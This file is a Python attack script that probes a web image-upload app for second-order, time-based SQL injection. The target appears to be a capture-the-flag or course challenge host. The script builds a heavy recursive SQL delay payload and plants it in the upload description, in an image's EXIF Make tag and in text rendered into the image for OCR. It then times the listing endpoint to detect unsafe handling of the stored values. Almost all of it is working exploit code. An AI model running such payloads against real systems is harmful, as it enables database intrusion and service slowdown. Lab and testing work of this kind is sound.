# second_order.py — the INSERT is parameterized, but maybe a SELECT/other query later uses a
# STORED value unsafely (second-order SQLi). Store a heavy time-payload in various stored fields,
# then trigger reads/actions and time them. If the STORED value is concatenated on read, the
# read (GET /images/<uid>) will be slow.
from PIL import Image, ImageDraw, ImageFont
import piexif, base64, requests, time

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
base_img = Image.open("paisaje.png").convert("RGB")
HEAVY = "(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000) SELECT x FROM c))"
q="'"

def make_uri(ocr_text=None, make_val=b"Samsung"):
    img=base_img.copy()
    if ocr_text:
        img=img.resize((1400,300)); d=ImageDraw.Draw(img)
        try: f=ImageFont.truetype("C:/Windows/Fonts/consolab.ttf",28)
        except: f=ImageFont.load_default()
        d.rectangle([0,0,1400,80],fill=(255,255,255)); d.text((20,20),ocr_text,font=f,fill=(0,0,0))
    img.save("so.jpg","jpeg",quality=80)
    def dms(x):
        dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:make_val,piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"so.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("so.jpg","rb").read()).decode()

# 1) store a heavy payload in DESCRIPTION (stored raw-ish), then time the LIST read
payload = q+"||"+HEAVY+"||"+q
requests.post(f"{BASE}/upload", json={"image":make_uri(),"description":payload,"user_id":UID})
# time a normal list read now that a payload description is stored
t=time.time(); r=requests.get(f"{BASE}/images/{UID}"); print("list read after desc payload:", round(time.time()-t,2), "s", r.status_code)

# 2) baseline list read time for comparison
t=time.time(); requests.get(f"{BASE}/images/{UID}"); print("list read baseline:", round(time.time()-t,2), "s")

# 3) store payload in make (stored escaped) then read
requests.post(f"{BASE}/upload", json={"image":make_uri(make_val=payload.encode()),"description":"so_make","user_id":UID})
t=time.time(); requests.get(f"{BASE}/images/{UID}"); print("list read after make payload:", round(time.time()-t,2), "s")

# 4) store payload via OCR then read
requests.post(f"{BASE}/upload", json={"image":make_uri(ocr_text=payload),"description":"so_ocr","user_id":UID})
t=time.time(); requests.get(f"{BASE}/images/{UID}"); print("list read after ocr payload:", round(time.time()-t,2), "s")
